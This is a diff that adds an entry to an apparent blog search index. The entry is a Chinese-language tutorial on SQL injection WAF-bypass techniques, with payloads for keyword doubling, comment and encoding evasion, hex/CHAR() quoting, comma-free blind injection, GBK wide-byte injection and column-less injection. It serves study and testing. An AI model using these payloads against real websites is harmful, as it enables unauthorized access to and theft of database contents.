@@ -51,4 +51,62 @@
 
 ]]></content>
   </entry>
+  <entry>
+    <title>SQL注入WAF绕过</title>
+    <url>/2023/05/03/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<h2 id="SQL注入WAF绕过"><a href="#SQL注入WAF绕过" class="headerlink" title="SQL注入WAF绕过"></a>SQL注入WAF绕过</h2><p>绕过类型：单双引号、空格、关键字、比较（逗号）–》函数&#x2F;关键字替代、注释    </p>
+<p>绕过方法：大小写、替换关键字、函数(关键字)、编码&#x2F;进制、sql特性</p>
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>此类绕过不经常使用，但是用的时候也不能忘了它，他原理是基于SQL语句不分大小写的，但过滤只过滤其中一种。</p>
+<h3 id="替换关键字-and"><a href="#替换关键字-and" class="headerlink" title="替换关键字(and)"></a>替换关键字(and)</h3><p>这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xx.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</span><br></pre></td></tr></table></figure>
+
+<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p><strong>payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注释</span><br><span class="line">select/**/*/**/from/**/yz;</span><br><span class="line"></span><br><span class="line">select%0a*%0afrom%0ayz; %0a 是回车    //%09 %0d</span><br><span class="line"></span><br><span class="line">select(a)from(yz);</span><br><span class="line"></span><br><span class="line">select(a)from(yz)where(a=1);</span><br></pre></td></tr></table></figure>
+
+<h3 id="内联注释-关键字"><a href="#内联注释-关键字" class="headerlink" title="内联注释(关键字)"></a>内联注释(关键字)</h3><p>union select</p>
+<p>有些WAF的过滤关键词像&#x2F;union\sselect&#x2F;g，就比如上面说的，很多时候我都是采用内联注释。更复杂的例子需要更先进的方法。比如添加了SQL关键字，我们就要进一步分离这两个词来绕过这个过滤器。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1/*!UnIoN*/SeLeCT</span><br><span class="line">/*!select*//*!**//*!from*//*!yz*/</span><br></pre></td></tr></table></figure>
+
+<h3 id="替换关键字"><a href="#替换关键字" class="headerlink" title="替换关键字"></a>替换关键字</h3><p>这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELselectECT 1,2,3,4</span><br></pre></td></tr></table></figure>
+
+<h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>有时后台界面会再次URL解码所以这时可以利用二次编码解决问题<br>后台语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$insert=$link-&gt;query(urldecode($_GET[&#x27;id&#x27;]));</span><br><span class="line"></span><br><span class="line">$row=$insert-&gt;fetch_row();</span><br><span class="line"></span><br><span class="line">select * from yz</span><br><span class="line"></span><br><span class="line">select * from  %2579%257a</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不用空格+单双引号的情况下--》查询出用户名为admin的数据</span><br></pre></td></tr></table></figure>
+
+<h3 id="十六进制绕过（引号绕过）-‘’-“”"><a href="#十六进制绕过（引号绕过）-‘’-“”" class="headerlink" title="十六进制绕过（引号绕过） ‘’ 		“”"></a>十六进制绕过（引号绕过） ‘’ 		“”</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select a from yz where b=0x32;</span><br><span class="line"></span><br><span class="line">select * from yz where b=char(0x32);</span><br><span class="line"></span><br><span class="line">select * from yz where b=char(0x67)+char(0x75)+char(0x65)+char(0x73)+char(0x74)</span><br><span class="line"></span><br><span class="line">-------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select column_name  from information_schema.tables where table_name=&quot;users&quot;</span><br><span class="line"></span><br><span class="line">select column_name  from information_schema.tables where table_name=0x7573657273</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;aaa&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;GO&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$str=$_GET[&#x27;aaa&#x27;];</span><br><span class="line"></span><br><span class="line">//$str = &quot;hello world&quot;; // 输入的字符串</span><br><span class="line">$hex = &quot;&quot;; // 用于存储转换后的16进制字符串</span><br><span class="line">for ($i = 0; $i &lt; strlen($str); $i++) &#123;</span><br><span class="line">    $hex .= &quot;CHAR(0X&quot; . dechex(ord($str[$i])) . &quot;)&quot;;</span><br><span class="line">    if ($i != strlen($str) - 1) &#123;</span><br><span class="line">        $hex .= &quot;+&quot;; // 每个字符之间使用+符号分隔</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $hex; // 输出转换后的16进制字符串</span><br></pre></td></tr></table></figure>
+
+<h3 id="逗号绕过-盲注"><a href="#逗号绕过-盲注" class="headerlink" title="逗号绕过(盲注)"></a>逗号绕过(盲注)</h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决。limit 可以使用 offset ;</p>
+<p>substr(),mid(),   - &gt; from for</p>
+<p>limit -&gt;offset</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(),mid()</span><br><span class="line"></span><br><span class="line">mid(user() from 1 for 1)</span><br><span class="line"></span><br><span class="line">substr(user() from 1 for 1)   //substr((payload), 1, 1))</span><br><span class="line"></span><br><span class="line">select substr(user()from -1) from yz ;</span><br><span class="line"></span><br><span class="line">select ascii(substr(user() from 1 for 1)) &lt; 150;</span><br><span class="line"></span><br><span class="line">同时也可以利用替换函数</span><br><span class="line"></span><br><span class="line">select left(database(),2)&gt;&#x27;tf&#x27;;</span><br><span class="line"></span><br><span class="line">selete * from testtable limit 2,1;</span><br><span class="line"></span><br><span class="line">selete * from testtable limit 2 offset 1;</span><br></pre></td></tr></table></figure>
+
+<h3 id="比较符-lt-gt-绕过"><a href="#比较符-lt-gt-绕过" class="headerlink" title="比较符(&lt;,&gt;)绕过"></a>比较符(&lt;,&gt;)绕过</h3><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。</p>
+<p>如果无法使用比较操作符，那么就需要使用到greatest，strcmp来进行绕过了。</p>
+<p>greatest</p>
+<p>least</p>
+<p>strcmp(字符串比较)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GREATEST() 函数用于返回一组值中的最大值，它可以接受两个或多个参数，返回这些参数中的最大值。例如，GREATEST(1,2,3) 将返回 3。</span><br><span class="line"></span><br><span class="line">least() 返回最小值</span><br><span class="line">least(1,2,3) 将返回 1。</span><br><span class="line"></span><br><span class="line">STRCMP() 函数用于比较两个字符串，它接受两个参数，并返回一个表示比较结果的整数值。如果第一个字符串小于第二个字符串，返回负数；如果第一个字符串大于第二个字符串，返回正数；如果两个字符串相等，则返回 0。例如，STRCMP(&#x27;abc&#x27;, &#x27;def&#x27;) 将返回一个负数，而 STRCMP(&#x27;abc&#x27;, &#x27;abc&#x27;) 将返回 0。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br><span class="line"></span><br><span class="line">select strcmp(left(database(),1),0x32);#lpad(&#x27;asd&#x27;,2,0)</span><br><span class="line"></span><br><span class="line">if(substr(id,1,1)in(0x41),1,3)</span><br><span class="line"></span><br><span class="line">-- 新学习了一种骚骚的注入姿势in、between、order by</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select * from yz where a in (&#x27;aaa&#x27;);</span><br><span class="line">select substr(a,1,1) in (&#x27;a&#x27;) from yz ;</span><br><span class="line"></span><br><span class="line">select * from yz where a between &#x27;a&#x27; and &#x27;b&#x27;;</span><br><span class="line">select * from yz where a between 0x89 and 0x90;</span><br><span class="line"></span><br><span class="line">select * from yz union select 1,2,3 order by 1;</span><br><span class="line">-- 也可以用like，根据排列顺序进行真值判断</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h3><p>在注入时的注释符一般为# –当两者不能用时就不能闭合引号<br>这里介绍一个奇淫巧技</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,2,3 from yz where &#x27;1&#x27;/1=(1=1)/&#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">(1=1)中就有了判断位为下面的注入打下基础</span><br><span class="line"></span><br><span class="line">?id=1&#x27;and &#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=1&#x27;/1=(1=1)/&#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27;1&#x27;/1=(1=1)=&#x27;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;$id  &#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤比较符+逗号+空格-》判断users 表中 id=1 的（username）字段 第一个字符是不是‘D’</span><br></pre></td></tr></table></figure>
+
+<h3 id="宽字节绕过"><a href="#宽字节绕过" class="headerlink" title="宽字节绕过"></a>宽字节绕过</h3><p>字节注入也是在最近的项目中发现的问题，大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在%df\’ &#x3D;%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗’，也就是说：%df\’ &#x3D; %df%5c%27&#x3D;縗’，有了单引号就好注入了。</p>
+<p>注：select防止用户自定义的名称和mysql保留字冲突</p>
+<h3 id="with-rollup"><a href="#with-rollup" class="headerlink" title="with rollup"></a>with rollup</h3><p>一般结合group by使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1 as test from  yz group by test with rollup limit 1 offset 1;</span><br><span class="line"></span><br><span class="line">+------+</span><br><span class="line"></span><br><span class="line">| test |</span><br><span class="line"></span><br><span class="line">+------+</span><br><span class="line"></span><br><span class="line">| NULL |</span><br><span class="line"></span><br><span class="line">+------+</span><br></pre></td></tr></table></figure>
+
+<h3 id="13-无列名注入"><a href="#13-无列名注入" class="headerlink" title="13 无列名注入"></a>13 无列名注入</h3><p>给未知列名起别名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select a from (select 1,2,3 a union select * from yz)v;</span><br></pre></td></tr></table></figure>
+
+<h3 id="14-判断列数绕过"><a href="#14-判断列数绕过" class="headerlink" title="14 判断列数绕过"></a>14 判断列数绕过</h3><p>当order by 被过滤后就可以使用into 变量来绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from yz limit 1,1 into @a,@b,@c;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
 </search>
